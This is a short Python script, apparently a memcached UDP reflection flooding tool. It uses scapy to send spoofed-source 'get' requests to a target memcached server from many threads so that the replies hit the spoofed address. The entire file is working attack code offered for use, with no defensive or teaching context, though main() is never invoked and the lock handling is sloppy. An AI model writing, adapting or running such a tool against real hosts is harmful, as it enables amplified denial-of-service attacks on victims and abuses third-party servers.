# !/usr/bin/python
# coding=utf-8

from scapy.all import *
import threading

screenLock = threading.Semaphore(value=1)

global Count
Count = 0


def UDP_get(target_host, target_port, var_name, src_ip, src_port, count_page):
    global Count

    if Count >= count_page:
        print('Atrack is end!')

        exit(0)

    data = "\x00\x00\x00\x00\x00\x01\x00\x00get " + var_name + "\r\n"

    pkt = scapy.all.IP(dst=target_host, src=src_ip) / scapy.all.UDP(sport=src_port, dport=target_port) / data

    send(pkt, inter=1, count=1)

    screenLock.acquire()

    Count = Count + 1

    # print("[+] Sending the "+'%d' %Count+" UDP pages")

    if Count >= count_page:
        print('Atrack is end!')

        exit(0)

    screenLock.release()


def UDP_Attrack(target_host, target_port, var_name, src_ip, src_port, count, count_page):
    global Count
    while (Count <= count_page):

        for i in range(count):
            # UDP_get(target_host,target_port,var_name,src_ip,src_port)

            th = threading.Thread(target=UDP_get,
                                  args=(target_host, target_port, var_name, src_ip, src_port, count_page))

            th.start()


def main():
    target_host = input("target service host:")

    target_port = input("target service port:")

    var_name = input("the key name:")

    src_ip = input("the attrack host:")

    src_port = input("the attrack port:")

    Thread_count = input("the Count of Threading:")

    Count_page = input("the Count of page:")

    UDP_Attrack(target_host, int(target_port), var_name, src_ip, int(src_port), int(Thread_count), int(Count_page))
